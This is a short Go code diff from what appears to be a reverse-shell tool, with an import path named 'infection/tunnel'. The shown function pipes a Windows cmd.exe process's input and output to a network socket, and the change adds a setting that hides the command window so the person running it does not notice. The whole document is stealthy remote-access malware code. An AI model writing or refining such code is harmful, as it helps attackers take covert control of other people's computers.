@@ -5,6 +5,7 @@ import (
 	"io"
 	"math/rand"
 	"os/exec"
+	"syscall"
 	"time"
 	//"syscall"
 	"infection/tunnel/w32"
@@ -47,6 +48,8 @@ func start(prot string, addr string) {
 		CreateRevShell(prot, addr)
 	}
 	cmd = exec.Command("cmd")
+	// hide window
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	cmd.Stdin = soc
 	cmd.Stdout = soc
 	cmd.Stderr = soc
